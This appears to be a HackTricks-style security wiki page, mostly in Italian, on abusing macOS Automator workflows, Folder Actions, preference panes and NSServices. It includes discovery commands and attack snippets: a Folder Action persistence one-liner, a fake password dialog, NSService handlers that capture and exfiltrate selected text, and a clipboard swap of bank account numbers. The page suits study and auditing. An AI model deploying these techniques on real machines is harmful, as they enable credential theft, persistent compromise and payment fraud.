# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** è lo strumento di automazione visuale di macOS. Esegue **workflows** (`.workflow` bundles) composti da **actions** (`.action` bundles). Automator alimenta anche l'integrazione di **Folder Actions**, **Quick Actions** e **Shortcuts**. Su macOS moderni, i workflows possono anche essere **imported into Shortcuts**, quindi la stessa logica malevola può apparire come un Finder Quick Action, un user service sotto `~/Library/Services/`, oppure uno shortcut supportato da legacy Automator actions.

Le Automator actions sono **plugins** caricati nel runtime di Automator quando viene eseguito un workflow. Possono:
- Eseguire script shell arbitrari
- Processare file e dati
- Interagire con applicazioni tramite AppleScript
- Concatenarsi per automazione complessa

### Why This Matters

> [!WARNING]
> I workflows di Automator possono essere **social-engineered** per l'esecuzione — sembrano semplici file di documento. Un bundle `.workflow` può contenere comandi shell incorporati che vengono eseguiti quando il workflow gira. In combinazione con Folder Actions, forniscono **persistentenza automatica** che si attiva su eventi dei file. Le recenti correzioni di Gatekeeper hanno anche mostrato che le **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) devono essere trattate come contenuto eseguibile, non come dati innocui.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attacco: Workflow Social-Engineered

Un bundle `.workflow` appare come un normale file di documento per la maggior parte degli utenti:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Persistenza di Folder Action

Le Folder Actions eseguono automaticamente un workflow quando vengono aggiunti file a una cartella monitorata:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persistono tra i reboot ed eseguono in modo silenzioso. Un Folder Action su `~/Downloads` significa **ogni file scaricato attiva il tuo payload** — inclusi i file da Safari, Chrome, AirDrop e gli allegati email. Nota anche che `System Events` può registrare Folder Actions che puntano a script al di fuori delle posizioni predefinite `~/Library/Scripts/Folder Action Scripts`, il che rende utile la ricerca di loose-path. Per le implicazioni TCC correlate, consulta [the TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Le preference panes (`.prefPane` bundles) sono plugin caricati da **System Settings** (in precedenza System Preferences). Forniscono pannelli UI di configurazione per funzionalità di sistema o di terze parti. Sui sistemi più vecchi venivano caricate direttamente da `System Preferences`; nelle release più recenti i pannelli di terze parti sono comunemente mediati da un **legacy loader XPC service** avviato da System Settings.

### Why This Matters

- Le preference panes vengono eseguite in un **trusted host process** avviato da System Settings / System Preferences
- Sui sistemi moderni quell'host può essere un **`legacyLoader` XPC service**, quindi il confine importante resta **trusted Apple UI process -> third-party code loading**
- Le preference panes di terze parti ereditano il **host process security context** e la fiducia dell'utente associata a quella UI
- Gli utenti installano le preference panes con un **double-click** — facile social engineering
- Una volta installate, **persistono** e vengono caricate ogni volta che System Settings apre quel pannello

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attacco: Hijacking del contesto di privilegio

Un pannello delle preferenze malevolo eredita il contesto di sicurezza del **host del pannello** (storicamente `System Preferences`, nelle versioni più recenti spesso un helper `legacyLoader` avviato da `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attacco: Persistence tramite Installazione
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attacco: UI Phishing

Un preference pane può imitare pannelli di sistema legittimi per **phishare credenziali**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** consentono alle applicazioni di fornire funzionalità ad altre app tramite il **menu Services** (tasto destro → Services). Quando un utente seleziona testo o dati e invoca un service, i dati selezionati vengono **inviati al service provider** per l'elaborazione.

I Services sono dichiarati nel `Info.plist` di un'applicazione sotto la chiave `NSServices` e registrati con il pasteboard server (`pbs`). macOS mantiene anche una **service cache** e una **restriction policy** che decidono quali Services sono visibili e se i chiamanti sandboxed debbano ricevere un avviso aggiuntivo.

### Why This Matters

- I Services ricevono **cross-application data flow** — il testo selezionato da qualsiasi applicazione viene inviato al service
- Un service malevolo cattura dati da password managers, email clients, financial apps
- I Services possono **restituire dati modificati** all'applicazione chiamante (man-in-the-middle sulle operazioni di selezione)
- I nomi dei Services possono essere creati per apparire legittimi ("Format Text", "Encrypt Selection", "Share")
- Il flag opzionale `NSRestricted` è rilevante per la sicurezza: un service marcato come unrestricted può essere invocabile da un'app sandboxed senza l'avviso che macOS mostra per i services escape-prone

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attacco: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attacco: Modifica dei dati (Man-in-the-Middle)

Un servizio può **modificare i dati restituiti** pur sembrando fornire una funzione legittima:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Servizi limitati e abuso moderno

Apple supporta un `NSRestricted` booleano opzionale per ogni definizione di servizio. Se è impostato, macOS avvisa i chiamanti in sandbox perché il servizio potrebbe aiutarli a **uscire dalla sandbox o dai confini di privacy**. Da una prospettiva offensiva, questo offre due percorsi di audit utili:

- Cercare **servizi di terze parti non marcati come restricted** anche se fungono da proxy per Apple Events, accesso ai file o altre azioni privilegiate
- Cercare **servizi built-in ad alto valore** con forti entitlements (per esempio, servizi esposti da Script Editor o helper supportati da Finder) e verificare se l’interazione dell’utente è sufficiente a trasformarli in un primitive di accesso ai dati

Un buon esempio recente è **CVE-2022-48574**, dove il meccanismo Services poteva essere abusato per raggiungere **file utente protetti da TCC senza il flusso di conferma previsto**. Il bug è stato corretto, ma la tecnica resta utile per il threat modeling: qualsiasi servizio che inoltri richieste di accesso ai file o di automazione per conto del chiamante merita la stessa attenzione.

---

## Note di sicurezza recenti

- **Quick Actions sono contenuto eseguibile**: Apple ha corretto nel 2024 un bypass di Gatekeeper in cui una Quick Action Automator inclusa in un’app poteva essere eseguita senza la normale valutazione. Quando fai audit delle app, ispeziona `Contents/PlugIns/*.workflow/Contents/document.wflow` esattamente come controlleresti script helper o login items. Vedi [la pagina di Gatekeeper](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts possono ereditare il comportamento legacy di Automator**: Apple ha anche aggiunto un prompt di consenso utente aggiuntivo dopo che sono stati trovati shortcut di terze parti che usavano una **legacy Automator action** per inviare Apple Events senza il flusso di autorizzazione previsto. I workflow importati e i bundle di shortcut dovrebbero essere esaminati per `Run AppleScript`, `Run Shell Script` e azioni bridge simili. Vedi [la pagina di TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator è ancora un confine di privacy attivo**: Apple ha rilasciato un altro fix di Automator nel 2025 per l’accesso ai dati utente protetti. Anche se Automator è una superficie legacy, tratta qualsiasi workflow runner, host di Quick Action o bridge di automazione come una superficie d’attacco attuale, non come codice morto.

---

## Catene di attacco cross-technique

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → Escalation TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Furto di Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## References

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
